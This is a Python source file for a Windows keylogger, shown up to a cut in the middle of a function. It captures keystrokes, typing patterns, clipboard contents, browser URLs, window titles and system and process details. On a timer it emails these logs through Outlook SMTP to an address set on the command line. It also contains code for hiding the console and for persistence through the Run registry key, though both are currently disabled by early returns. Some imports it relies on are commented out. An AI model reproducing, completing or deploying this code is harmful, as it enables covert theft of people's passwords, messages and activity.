''' "<folder path>\Log.exe" -g "XXX@outlook.com" -p "password" -r "receiver_emailId@xxx.com" -x 5 -m 10 -t Y  '''
import platform
import ctypes
''' The OS module in Python provides functions for interacting with the operating system. OS comes under Python’s standard utility modules. This module provides a portable way of using operating system-dependent functionality. '''
import os
import socket
import sys
import threading

''' Python's time module allows to work with time in Python. It allows functionality like getting the current time, pausing the Program from executing, etc. '''
import time
from datetime import datetime, timedelta
from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
import keyboard
import numpy as np
import psutil
import pywinauto.timings
import win32api
import win32console
import win32event
import win32gui
import winerror
#import pyperclip
#import mouse
#import pyautogui
import wmi

from PIL import Image, ImageGrab  # , ImageTk
from keyboard import is_pressed
#from pywinauto.application import Application
''' requests module for get/post requests '''
from requests import get
import argparse, re, requests

import config

''' Send SMTP Mail '''
import smtplib, ssl
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from email.mime.image import MIMEImage
from email import encoders
from email_validator import validate_email, EmailNotValidError

'''
import base64
from email.message import EmailMessage
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from google_auth_oauthlib.flow import InstalledAppFlow
'''
'''
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Hash import SHA3_512
from Cryptodome.PublicKey import RSA
from win32clipboard import OpenClipboard, CloseClipboard, GetClipboardData
from pynput.mouse import Listener as MouseListener
# import urllib.request, urllib.parse, urllib.error, urllib.request, urllib.error, urllib.parse
# import base64
# import hashlib
# import multiprocessing
# import subprocess
# from tkinter import scrolledtext
# import random
# import signal
# import stat
# import tkinter as tk
# import Mice_Log
# import Cryptodome.Util
# import socks
# import win32con
# import win32ui
# import string
'''
parser = argparse.ArgumentParser()

parser.add_argument('-g', '--from-email',
                    help='Sender Outlook Email id', metavar='example@outlook.com')
parser.add_argument('-p', '--mail_sender_pass', metavar='SECRET_PASS',
                    help='password of the sender Outlook mail account')
parser.add_argument('-r', '--to-email', metavar='XXX@gmail.com',
                    help='email that receive the logs any valid email id')
parser.add_argument('-x', '--MAX_MAIL_SESSION', metavar='5 -> totally 5 emails are send',
                    help='Total number of emails be delivered. After than application closed automatically. Must be > 0 ')
parser.add_argument('-m', '--MINUTES_TO_EMAIL', metavar='10 for 10 Minutes',
                    help='How long should the mail be delivered? \n minutes in number should be > 0 ')
parser.add_argument('-t', '--typing_pattern_log', metavar='Yes or No',
                    help='Log Typing Pattern?')

args = parser.parse_args()

#####       Variables

import browser
from browser import *

import mice
from mice import *

config.from_email = ""  # Sender Email Id
to_email = ""  # Receiver EmailId
mail_sender_pass = ""  # Sender Email Password
MINUTES_TO_EMAIL = 10  # minutes in number should be > 0 -> How long should the mail be delivered?
MAX_MAIL_SESSION = 5  # Total number of emails be delivered. after than application closed.
mail_session = 1

sysinfofilepath, config.LOGFILEPATH = "", ""
mode = "debug"
config.prev_window_title, prev_url, config.window_title, urlBuffer = "", "", "", ""
config.line_buffer, window_name, clipboard_val, clipboard_logged, prev_win_title, config.status = '', '', '', '', '', ''
backspace_buffer_len, LOGCOUNT, config.is_browser = 0, 0, 0
config.shift_on, capslock_on, upper_case = False, False, False

mail_timer = None
mouse_timer = None
sys_timer = None
wintitle_timer = None
mail_flow = None
mail_creds = None
CHAR_LIMIT = 382
USERNAME = os.getlogin()
start_time = None
typed_text = ""
last_activity = 0
total_keys_pressed = 0
typing_pattern_log = True
# MINUTES_TO_LOG_TIME = 1


'''
if len(sys.argv) == 1:
    sys.argv = [sys.argv[0], 'local', '']
elif len(sys.argv) > 10:
    exit(0)
if any([len(k) > 260 for k in sys.argv]):
    exit(0)
'''


def validate_args():
    global typing_pattern_log
    if args.typing_pattern_log:
        if str(args.typing_pattern_log).lower() == "no" or str(args.typing_pattern_log).lower() == "n":
            typing_pattern_log = False
        elif str(args.typing_pattern_log).lower() == "yes" or str(args.typing_pattern_log).lower() == "y":
            typing_pattern_log = True
        else:
            print("Log Typing Pattern is invalid")
            exit()


validate_args()


def validate_email_args():
    errorstr = ""
    if args.MAX_MAIL_SESSION:
        if args.MAX_MAIL_SESSION.isnumeric() == False:
            errorstr += F"-x should be numeric \n"
        elif int(args.MAX_MAIL_SESSION) <= 0:
            errorstr += F"-x should be greater than 0 \n"

    if args.MINUTES_TO_EMAIL:
        if args.MINUTES_TO_EMAIL.isnumeric() == False:
            errorstr += F"-m should be numeric \n"
        elif int(args.MINUTES_TO_EMAIL) <= 0:
            errorstr += F"-m should be greater than 0 \n"
    if args.from_email is None: args.from_email = ""
    if args.mail_sender_pass is None: args.mail_sender_pass = ""
    if args.to_email is None: args.to_email = ""
    if args.MINUTES_TO_EMAIL is None: args.MINUTES_TO_EMAIL = 10
    if args.MAX_MAIL_SESSION is None: args.MAX_MAIL_SESSION = 5
    args.from_email = args.from_email.strip()
    args.to_email = args.to_email.strip()

    def checkemail(email):
        global errorstr
        regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'

        try:
            if re.fullmatch(regex, email):
                return True
            else:
                return False
            '''
            # validate and get info
            v = validate_email(email ,timeout=15)
            # replace with normalized form
            return v["email"]
        except EmailNotValidError as e:
            errorstr += F"EmailNotValidError: {e} \n" 
            '''
        except Exception as e:
            errorstr += F"Checking Email Error: {e} \n"
        return False

    if args.from_email != "":
        if checkemail(args.from_email) == False:
            errorstr += F"-g invalid Sender Outlook Email id \n"
        elif "outlook.com" not in args.from_email.lower() :
            errorstr += F"-g Sender email id should be XXX@outlook.com Email id \n"

    if args.to_email != "":
        if checkemail(args.to_email) == False:
            errorstr += F"-r invalid Receiver Email id \n"

    if args.from_email != "" and args.to_email != "":
        if args.mail_sender_pass.strip() == "":
            errorstr += F"-p Password should not be empty \n"

    if args.from_email != "":
        if args.mail_sender_pass.strip() == "":
            errorstr += F"-p Password should not be empty\n"
        if args.to_email.strip() == "":
            errorstr += F"-p Receiver Email Id should not be empty\n"
    '''
    f_test("\n")
    f_test(F"sender outlook mail --g\t=\t{args.from_email}")
    f_test(F"mail_sender_pass --p\t=\t{args.mail_sender_pass}")
    f_test(F"to_email --r\t\t=\t{args.to_email}")
    f_test(F"MAX_MAIL_SESSION --x\t=\t{args.MAX_MAIL_SESSION}")
    f_test(F"MINUTES_TO_EMAIL --m\t=\t{args.MINUTES_TO_EMAIL}")
    f_test("\n")
    '''
    if errorstr != "":
        print(errorstr)
        exit()

    global to_email, mail_sender_pass, MINUTES_TO_EMAIL, MAX_MAIL_SESSION
    config.from_email = args.from_email
    to_email = args.to_email
    mail_sender_pass = args.mail_sender_pass
    MINUTES_TO_EMAIL = float(args.MINUTES_TO_EMAIL)
    MAX_MAIL_SESSION = int(args.MAX_MAIL_SESSION)


validate_email_args()
# config.from_email, to_email, mail_sender_pass, MAX_MAIL_SESSION, MINUTES_TO_EMAIL="","","",3,5

'''
config.from_email=""
to_email=""
mail_sender_pass=""
MAX_MAIL_SESSION=1
MINUTES_TO_EMAIL=1
'''


def check_internet():
    try:
        r_status_code = requests.get('https://www.google.com').status_code
        if r_status_code == 200:
            return True
        else:
            return False
    except:
        return False


if not check_internet():
    print("Internet connection not found.\n\t Email Won't go\n")
    MINUTES_TO_EMAIL = 0
    MAX_MAIL_SESSION = 0
    config.from_email = ""
elif not config.from_email or not to_email or not mail_sender_pass:
    MINUTES_TO_EMAIL = 0
    MAX_MAIL_SESSION = 0
    print("Email is not configured.\n\t Email Won't go\n")
else:
    print(
        F"Email is configured!\n\t Email is sent each {MINUTES_TO_EMAIL} minutes.\n\t\t Totally {MAX_MAIL_SESSION} Emails will be sent.\nApplication will be closed after {MINUTES_TO_EMAIL * MAX_MAIL_SESSION} minutes automatically\n")

current_file_path = os.path.realpath(sys.argv[0])
dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
current_file_name = os.path.split(os.path.realpath(sys.argv[0]))[-1]

if current_file_name.split(".")[-1] == 'exe':
    config.executable = True

path = os.path.join(dir_path, "LOG")
if not os.path.exists(path):
    os.makedirs(path)

path = os.path.join(path, USERNAME)
if not os.path.exists(path):
    os.makedirs(path)

formatted_date = datetime.now().strftime("%d%b%Y")

LOGFOLDERPATH = os.path.join(path, formatted_date)
if not os.path.exists(LOGFOLDERPATH):
    os.makedirs(LOGFOLDERPATH)

for x in os.listdir(LOGFOLDERPATH):
    if x.startswith("LogFile") and x.endswith(".txt"):
        LOGCOUNT += 1


def createlogfile():
    global LOGCOUNT, LOGFOLDERPATH, sysinfofilepath
    if not config.from_email or not to_email or not mail_sender_pass:
        LOGCOUNT = 0
        config.LOGFILEPATH = os.path.join(LOGFOLDERPATH, F"LogFile" + ".txt")
        sysinfofilepath = os.path.join(LOGFOLDERPATH, F"SysemInfo" + ".txt")
    else:
        LOGCOUNT += 1
        config.LOGFILEPATH = os.path.join(LOGFOLDERPATH, F"LogFile-{LOGCOUNT}" + ".txt")
        sysinfofilepath = os.path.join(LOGFOLDERPATH, F"SysemInfo-{LOGCOUNT}" + ".txt")
    # f_test(F"config.LOGFILEPATH={config.LOGFILEPATH}\nsysinfofilepath={sysinfofilepath}")
    if not os.path.exists(config.LOGFILEPATH):
        f = open(config.LOGFILEPATH, 'w')
        f.close()
    if not os.path.exists(sysinfofilepath):
        f = open(sysinfofilepath, 'w')
        f.close()


createlogfile()


def hide():
    return
    # Hide Console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


if config.executable:
    hide()

mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    if mode == "debug":
        f_test("Multiple instances are not allowed")
    exit(0)

PYTHON_EXEC_PATH = 'python'


def space(lenth):
    return "".ljust(lenth, " ")


def is_os_64bit():
    return platform.machine().endswith('64')


def computer_information():
    global sysinfofilepath
    with open(sysinfofilepath, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        length = 20
        x, y = pyautogui.size()
        f.write(("").rjust(len("SYSTEM INFO"), "*").center(60, " ") + '\n')
        f.write("SYSTEM INFO".center(60, " ") + '\n')
        f.write(("").rjust(len("SYSTEM INFO"), "*").center(60, " ") + '\n')
        f.write('\n')
        f.write("Hostname".ljust(length, " ") + " : " + hostname + "\n")
        f.write("UserName".ljust(length, " ") + " : " + os.getlogin() + "\n")
        f.write("Machine".ljust(length, " ") + " : " + platform.machine() + "\n")
        f.write("System Type".ljust(length, " ") + " : " + str(platform.architecture()[0]) + " operating system" + "\n")
        f.write("System".ljust(length, " ") + " : " + platform.system() + " " + platform.version() + '\n')
        f.write("Processor".ljust(length, " ") + " : " + (platform.processor()) + '\n')
        f.write("Screen Resolution".ljust(length, " ") + " : " + str(x) + " X " + str(y) + '\n')
        f.write("Private IP Address".ljust(length, " ") + " : " + IPAddr + "\n")
        try:

            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address".ljust(length, " ") + " : " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query" + '\n')

        f.write("Logged Time".ljust(length, " ") + " : " + datetime.now().strftime("%d-%m-%Y %H:%M") + "\n")


def ram_information():
    mem = psutil.virtual_memory()
    gigabyte = float(1024 * 1024 * 1024)
    mem_total = float(mem.total / gigabyte)

    # Assign variable with the value of currently available memory.
    mem_free = float(mem.free / gigabyte)

    # Assign variable with the value of currently used memory.
    mem_used = float(mem.used / gigabyte)
    global sysinfofilepath
    with open(sysinfofilepath, "a") as f:
        # Defining function ram_specs that uses modules/functions from psutil library and from variables_data.
        title = "RAM details".upper()
        length = 42
        f.write("\n\n\n")
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')
        f.write(title.center(60, " ") + '\n')
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')
        f.write('\n')
        f.write("Total memory is".ljust(length, " ") + " : " + format(round(float(mem_total), 2), ".2f").rjust(5,
                                                                                                               " ") + ' GBs' + "\n")
        f.write(
            "Current available memory is".ljust(length, " ") + " : " + format(round(float(mem_free), 2), ".2f").rjust(5,
                                                                                                                      " ") + ' GBs' + "\n")
        f.write("Current used memory is".ljust(length, " ") + " : " + format(round(float(mem_used), 2), ".2f").rjust(5,
                                                                                                                     " ") + ' GBs' + "\n")
        f.write("Percentage of RAM being utilized currently".ljust(length, " ") + " : " + format(
            round(float(mem.percent), 2), ".2f").rjust(5, " ") + ' %' + "\n")


def process_information():
    # Get list of running process sorted by Memory Usage

    listOfProcObjects = []
    # Iterate over the list
    for proc in psutil.process_iter():
        try:
            # Fetch process details as dict
            pinfo = proc.as_dict(attrs=['pid', 'name', 'username'])
            # pinfo = proc.as_dict()
            pinfo['vms'] = proc.memory_percent()
            # pinfo['vms'] = ( proc.memory_info().rss / (1024**2) ) #Virtual Memory Size
            # Append dict to list
            listOfProcObjects.append(pinfo)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    # Sort list of dict by key vms i.e. memory usage
    global sysinfofilepath

    with open(sysinfofilepath, "a") as f:

        title = "Top 5 process with highest memory usage".upper()
        heading = '|' + space(3) + str("Process Name").center(50, " ") + '|' + str(
            "Memory[%]").center(13, " ") + '|'
        length = len(heading)
        f.write("\n\n\n")
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')
        f.write(title.center(60, " ") + '\n')
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')

        # listOfRunningProcess = sorted(listOfRunningProcess, key=lambda procObj: procObj['vms'], reverse=True)
        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')
        f.write(heading + '\n')
        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')

        try:
            listOfProcObjects_3 = []
            listOfProcObjects = sorted(listOfProcObjects, key=lambda procObj: procObj['name'], reverse=False)
            prev_process_name, process_name = '', ''
            total_vms, int_i = 0, 0
            for elem in listOfProcObjects:

                process_name = str(elem["name"])
                if prev_process_name != process_name:
                    if int_i != 0:
                        if listOfProcObjects[int_i - 1]["name"] == prev_process_name:
                            # listOfProcObjects_2[ int_i - 1 ]["vms"] = total_vms // act as refrence variable changed in variable listOfProcObjects also
                            listOfProcObjects_3.append(dict(name=prev_process_name, vms=total_vms))
                        else:
                            print(F"failed\t{listOfProcObjects[int_i - 1]['name']}\t{prev_process_name}")
                    else:
                        listOfProcObjects_3.append(dict(name=process_name, vms=elem["vms"]))

                    prev_process_name = process_name
                    total_vms = 0
                int_i += 1
                total_vms += elem["vms"]
                # print(F"{elem['name']}\t{elem['vms']}\t{total_vms}\t{prev_process_name}")

            listOfProcObjects_3 = sorted(listOfProcObjects_3, key=lambda procObj: procObj['vms'], reverse=True)
            for elem in listOfProcObjects_3[:5]:
                f.write('|' + space(3) + str(elem["name"]).ljust(50, " ") + '|' + format(elem["vms"], ".2f").rjust(10,
                                                                                                                   " ") + space(
                    3) + '|' + '\n')

            listOfProcObjects_3 = None
        except Exception as e:
            print(e)
        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')
        #############

        services = ""
        try:
            stopped_services = wmi.WMI().Win32_Service(StartMode="Auto", State="Stopped")
            if stopped_services:
                for s in stopped_services:
                    services = services + s.Caption + "\n"
            else:
                services = "No automatic services were stopped"
        except Exception as e:
            services = "Getting Non Working Automatic Services List failed"
            pass

        title = "Non Working Automatic Services List".upper()
        length = 42
        f.write("\n\n\n")
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')
        f.write(title.center(60, " ") + '\n')
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')
        f.write('\n')
        f.write(services)
        ###########
        title = "How long each application has been open?".upper()
        heading = '|' + space(3) + str("Process - Window Name").center(80, " ") + '|' + str("Created On").center(13,
                                                                                                                 " ") + '|' + str(
            "Time Passed").center(13, " ") + '|'
        length = len(heading)
        f.write("\n\n\n")
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')
        f.write(title.center(60, " ") + '\n')
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')

        # listOfRunningProcess = sorted(listOfRunningProcess, key=lambda procObj: procObj['vms'], reverse=True)
        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')
        f.write(heading + '\n')
        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')
        app = pywinauto.Desktop(backend='uia')
        windows = app.windows()
        current_time = datetime.fromtimestamp(time.time())
        try:
            for window in windows:
                process_id = window.process_id()
                process = psutil.Process(process_id)
                start_time = process.create_time()
                start_time = datetime.fromtimestamp(start_time)
                elapsed_time = current_time - start_time

                f.write(
                    '|' + space(3) + (process.name() + ' - ' + str(window.window_text()).strip()).ljust(80, ' ') + '|'
                    + start_time.strftime('%H:%M:%S').center(13, " ") + '|'
                    + format_timedelta_to_HHMMSS(elapsed_time).center(13, " ") + '|' + '\n')
        except:
            pass
        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')
        ###########
        title = "Running Processes List".upper()
        heading = '|' + space(3) + str("Process Name").center(50, " ") + '|' + str("ID").center(10, " ") + '|' + str(
            "Memory[%]").center(13, " ") + '|'
        length = len(heading)
        f.write("\n\n\n")
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')
        f.write(title.center(60, " ") + '\n')
        f.write(("").rjust(len(title), "*").center(60, " ") + '\n')

        # listOfRunningProcess = sorted(listOfRunningProcess, key=lambda procObj: procObj['vms'], reverse=True)
        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')
        f.write(heading + '\n')
        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')
        listOfProcObjects = sorted(listOfProcObjects, key=lambda procObj: procObj['name'], reverse=False)
        for elem in listOfProcObjects:
            f.write('|' + space(3) + str(elem["name"]).ljust(50, " ") + '|'
                    + space(3) + str(elem["pid"]).ljust(7, " ") + '|'
                    + format(elem["vms"], ".2f").rjust(10, " ") + space(3) + '|' + '\n')

        f.write("|" + ("").ljust(length - 2, "-") + '|' + '\n')


def systeminfo():
    try:
        computer_information()
        ram_information()
        process_information()
    except Exception as e:
        print(e)


# systeminfo()
# exit()

def add_to_startup():
    return
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER,
                         key_val, 0, KEY_ALL_ACCESS)
    if config.executable:
        reg_value_prefix, reg_value_postfix = '', ''
    else:
        reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + PYTHON_EXEC_PATH + ' '
        reg_value_postfix = '"'
    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + mode + \
                (' encrypt' if encryption_on else '') + reg_value_postfix
    try:
        SetValueEx(key2change, "Start", 0, REG_SZ, reg_value)
    except Exception as e:
        f_test("add_to_startup error:")
        f_test(e)


# add_to_startup()


def send_message():
    global to_email, mail_sender_pass, sysinfofilepath, mail_session, MAX_MAIL_SESSION, mail_timer, sys_timer, MINUTES_TO_EMAIL, \
        USERNAME
    errorstr = ""
    try:
        if mail_timer: mail_timer.cancel()
        if not config.from_email or not to_email or not mail_sender_pass:
            return
        if mail_session > MAX_MAIL_SESSION:
            print("Mail Session Reached(a)")
            halt()
            return

        # f_test(F"Sending Email Session {mail_session}")
        log_local(getdate() + "\t" + F"Sending Email Session {mail_session}\n")
        # f_test(config.LOGFILEPATH)

        mail = MIMEMultipart()
        messagebody = ""
        # mail = MIMEText(messagebody) # don't use
        mail.preamble = messagebody
        mail["Subject"] = F"Keylogger Log Records: User [{USERNAME}]"
        mail["From"] = config.from_email
        mail["To"] = to_email
        SSL_context = ssl.create_default_context()
        server = smtplib.SMTP('smtp-mail.outlook.com', 587)
        # server  = smtplib.SMTP_SSL('smtp-mail.outlook.com', 465) # smtplib.SMTP("smtp.gmail.com", 465) #587
        server.ehlo()  # check connection
        # server.starttls()
        server.starttls(context=SSL_context)
        server.ehlo()  # check connection
        server.login(config.from_email, mail_sender_pass)

        # attach log files
        attachments = list()
        attachments.append(config.LOGFILEPATH)
        attachments.append(sysinfofilepath)

        if attachments:
            for attachment in attachments:
                with open(attachment, 'rb') as content_file:
                    content = content_file.read()
                    log_file = MIMEBase('application', 'octet-stream')
                    log_file.set_payload(content)
                    encoders.encode_base64(log_file)
                    log_file.add_header(F"Content-Disposition",
                                        f"attachment; filename={os.path.basename(attachment).split('/')[-1]}", )
                    mail.attach(log_file)
        server.sendmail(config.from_email, to_email, mail.as_string())
        server.quit()

        mail_session += 1
        if mail_session <= MAX_MAIL_SESSION:
            os.remove(config.LOGFILEPATH)
            os.remove(sysinfofilepath)
            createlogfile()
            log_local(getdate() + "\t" + F"Email Session {mail_session - 1} completed\n")
            sys_timer = threading.Timer(5, systeminfo)
            sys_timer.start()
        if mail_session == (MAX_MAIL_SESSION):
            # f_test("Mail Session Reached(b)")
            mail_timer = threading.Timer(MINUTES_TO_EMAIL * 60, halt_close)
            mail_timer.start()
            return

        if mail_session > MAX_MAIL_SESSION:
            if mail_timer: mail_timer.cancel()
            # f_test("Mail Session Reached(c)")
            halt()
        else:
            mail_timer = threading.Timer(MINUTES_TO_EMAIL * 60, send_message)
            mail_timer.start()

    except smtplib.SMTPException as e:
        errorstr = (F"[-] Sending Mail Error!, Error: {e}")
    except smtplib.SMTPServerDisconnected as e:
        errorstr = (F"[-] SMTP Server Disconnected!, Error: {e}")
    except smtplib.SMTPConnectError as e:
        errorstr = (F"[-] SMTP Connect Error, Error: {e}")
    except socket.gaierror as e:
        errorstr = (F"[-] Socket Gaierror, Error: {e}")
    except Exception as e:
        errorstr = (F"Sending Email Failed, Error: {e}")

    if errorstr:
        log_local(getdate() + "\t" + errorstr + "\n")
        mail_timer = threading.Timer(MINUTES_TO_EMAIL * 60, send_message)
        mail_timer.start()


'''
SCOPES = ['https://www.googleapis.com/auth/gmail.send']
def send_gmail():  # subject:str, to_email:str, attachments: list=None
    """Create and send an email message
    f_test the returned  message id
    Returns: Message object, including message id    """
    global config.from_email, to_email
    if os.path.exists(os.path.join(dir_path, 'credentials.json')) == False: return  # Mail
    if not config.from_email or not to_email: return

    global mail_flow, mail_creds, mail_session, mail_timer, sys_timer, MINUTES_TO_EMAIL
    try:
        if mail_timer: mail_timer.cancel()
        if (mail_flow == None):
            mail_flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            mail_creds = mail_flow.run_local_server(port=0)
        if mail_session > MAX_MAIL_SESSION:
            print("Mail Session Reached(a)")
            exit(0)
            return
        log_local(getdate() + "\t" + F"Sending Email Session {mail_session}")
        # f_test(F"Sending Email Session {mail_session}")
        service = build('gmail', 'v1', credentials=mail_creds)
        message = EmailMessage()

        messagebody = ""

        subject = F'Keylogger Log Records - Session {mail_session}'
        message.set_content(messagebody)

        # I added this part
        attachments = list()
        attachments.append(config.LOGFILEPATH)
        attachments.append(sysinfofilepath)
        if attachments:
            for attachment in attachments:
                with open(attachment, 'rb') as content_file:
                    content = content_file.read()
                    # f_test(F"Attaching {os.path.basename(attachment).split('/')[-1]}")
                    message.add_attachment(content, maintype='application', subtype=(attachment.split('.')[1]),
                                           filename=os.path.basename(attachment).split('/')[-1])

        createlogfile()
        message['To'] = to_email
        message['From'] = config.from_email
        message['Subject'] = subject
        # encoded message
        encoded_message = base64.urlsafe_b64encode(message.as_bytes()).decode()

        create_message = {
            'raw': encoded_message
        }
        # pylint: disable=E1101
        sendmail = (service.users().messages().send
                    (userId="me", body=create_message).execute())
        if mail_session == (MAX_MAIL_SESSION - 1):
            print("Mail Session Reached(b)")
            exit(0)
            return

        sys_timer = threading.Timer(5, systeminfo)
        sys_timer.start()

        if sendmail["id"]: mail_session += 1
        f_test(F'Email Message Id: {sendmail["id"]}')
    except HttpError as error:
        print(F'An error occurred: {error}')
        # send_message = None
    except Exception as e:
        print(e)
    finally:
        try:
            if mail_session != (MAX_MAIL_SESSION - 1) or mail_session > MAX_MAIL_SESSION:
                if mail_timer: mail_timer.cancel()
            else:
                mail_timer = threading.Timer(MINUTES_TO_EMAIL * 60, send_message)
                mail_timer.start()
        except Exception as e:
            print(F"Mail Timer error {e}")
'''


def get_clipboard_value():
    set_status("get_clipboard_value()")
    clipboard_value = None
    try:
        clipboard_value = pyperclip.paste()

        # OpenClipboard()
        # clipboard_value = GetClipboardData()
    except:
        pass
    # CloseClipboard()
    if clipboard_value:
        if 0 < len(clipboard_value) < 500:
            return clipboard_value
    else:
        return ""


pyperclip.copy("")

# time_logged = datetime.now() - timedelta(minutes=MINUTES_TO_LOG_TIME)


config.url_timer = threading.Timer(3, browser.get_url)
config.url_timer.start()


def get_capslock_state():
    hll_dll = ctypes.WinDLL("User32.dll")
    vk = 20  # 0x14
    return True if hll_dll.GetKeyState(vk) == 1 else False


capslock_on = get_capslock_state()


def update_upper_case():
    global capslock_on
    if (capslock_on and not config.shift_on) or (not capslock_on and config.shift_on):
        res = True
    else:
        res = False
    return res


upper_case = update_upper_case()

'''
def show_screenshot():
    try:
        f_test("show_screenshot")
        tk.Tk().withdraw()
        root = tk.Toplevel()
        w, h = root.winfo_screenwidth(), root.winfo_screenheight()
        root.overrideredirect(1)
        root.geometry("%dx%d+0+0" % (w, h))
        root.focus_set()
        root.bind("<Escape>", lambda e: (e.widget.withdraw(), e.widget.quit()))
        canvas = tk.Canvas(root, width=w, height=h)
        canvas.pack(in_=root)
        canvas.configure(background='black')
        screenshot = ImageGrab.grab()
        ph = ImageTk.PhotoImage(screenshot)
        canvas.create_image(w / 2, h / 2, image=ph)
        root.wm_attributes("-topmost", 1)
        root.mainloop()
        return
    except Exception as e:
        print("show_screenshot")
        print(e)
'''


def count_image_diff(img1, img2):
    s = 0
    if img1.getbands() != img2.getbands():
        return -1
    for band_index, band in enumerate(img1.getbands()):
        m1 = np.array([p[band_index] for p in img1.getdata()]).reshape(*img1.size)
        m2 = np.array([p[band_index] for p in img2.getdata()]).reshape(*img2.size)
        s += np.sum(np.abs(m1 - m2))
    return s


def has_screen_changed(screenshot_1):
    screenshot_2 = ImageGrab.grab()
    diff = count_image_diff(screenshot_1, screenshot_2)
    if diff < 1000000:  # a change significant enough
        return False, screenshot_2
    else:
        return True, screenshot_2


def detect_user_inactivity():
    # Detect user inactivity by detecting screen change + mouse movement + key press
    seconds_inactive = 0
    screenshot_1 = ImageGrab.grab()
    mouse_saved_pos = win32api.GetCursorPos()
    keys_saved_pressed = keyboard.get_hotkey_name()

    sleep = 20  # seconds
    while seconds_inactive < sleep * 9:  # 3 minutes of mouse + keyboard + screen inactivity
        time.sleep(sleep)
        screen_changed, screenshot_1 = has_screen_changed(screenshot_1)
        mouse_pos, keys_pressed = win32api.GetCursorPos(), keyboard.get_hotkey_name()
        if screen_changed or mouse_saved_pos != mouse_pos or keys_saved_pressed != keys_pressed:
            mouse_saved_pos, keys_saved_pressed = mouse_pos, keys_pressed
            seconds_inactive = 0
        else:
            seconds_inactive += sleep
    return


def is_program_already_open(program_path):
    for pid in psutil.pids():  # Iterates over all process-ID's found by psutil
        try:
            p = psutil.Process(pid)  # Requests the process information corresponding to each process-ID,
            # the output wil look (for example) like this: <psutil.Process(pid=5269, name='Python') at 4320652312>
            if program_path in p.exe():  # checks if the value of the program-variable
                # that was used to call the function matches the name field of the plutil.Process(pid)
                # output (see one line above).
                return pid, p.exe()
        except:
            continue
    return None, None


def find_top_windows(wanted_text=None, wanted_class=None, selection_function=None):
    def _normalise_text(control_text):
        return control_text.lower().replace('&', '')

    def _windowEnumerationHandler(hwnd, resultList):
        resultList.append((hwnd,
                           win32gui.GetWindowText(hwnd),
                           win32gui.GetClassName(hwnd)))

    results = []
    top_windows = []
    win32gui.EnumWindows(_windowEnumerationHandler, top_windows)
    for hwnd, window_text, window_class in top_windows:
        if wanted_text and not _normalise_text(wanted_text) in _normalise_text(window_text):
            continue
        if wanted_class and not window_class == wanted_class:
            continue
        if selection_function and not selection_function(hwnd):
            continue
        results.append(hwnd)
    return results


def log_debug():
    # Debug mode

    print(config.line_buffer)
    config.line_buffer, config.backspace_buffer_len = '', 0
    return True


def typing_pattern_inactivity(key_pressed: str):
    global last_activity, start_time, typed_text, total_keys_pressed, typing_pattern_log
    if not typing_pattern_log: return
    if last_activity == 0: last_activity = time.time()
    if time.time() - last_activity > 20:
        if len(typed_text) > 1:
            config.line_buffer += "\n\tTyped Text:\t" + typed_text
            config.line_buffer += "\n\tDue to the user's inactivity, the Typing Pattern is not computed."
            config.line_buffer += "\n"
        last_activity = 0
        typed_text = ""
        start_time = None
    else:
        if not start_time is None:
            total_keys_pressed += 1
            typed_text += key_pressed
        # if start_time is None: start_time = time.time()
        last_activity = time.time()


def typing_pattern():
    global last_activity, typed_text, start_time, total_keys_pressed, typing_pattern_log
    try:
        if not typing_pattern_log: return
        typing_pattern_inactivity("")
        if len(typed_text) <= 1 or start_time is None: return ""
        end_time = time.time()
        elapsed_time = end_time - start_time
        typing_speed = (total_keys_pressed - 1) / elapsed_time  # len(typed_text) / elapsed_time
        latency = end_time - start_time
        config.line_buffer += "\n"
        config.line_buffer += "\tTyping Pattern    Time:" + datetime.fromtimestamp(start_time).strftime("%H:%M:%S") \
                              + " to " + datetime.fromtimestamp(end_time).strftime("%H:%M:%S")
        config.line_buffer += "\tNo of Keys pressed:\t" + str(total_keys_pressed - 1)
        # config.line_buffer += "\n\tTyped Text:\t" + typed_text
        config.line_buffer += "\n\tTyping Speed:" + format(typing_speed, ".2f") + " characters per second" + \
                              "\tLatency/Elapsed Seconds:" + format(latency, ".2f")
        config.line_buffer += "\n"

    finally:
        typed_text = ""
        start_time = None
        last_activity = 0
        total_keys_pressed = 0


def log_it():
    check_task_managers()
    global mode  # , encryption_on
    if (config.line_buffer):
        typing_pattern()
        if log_local(getdate() + "\t" + config.line_buffer + "\n"): config.line_buffer = ""

    '''
    if mode == "local":
        log_local()
    elif mode == 'debug':
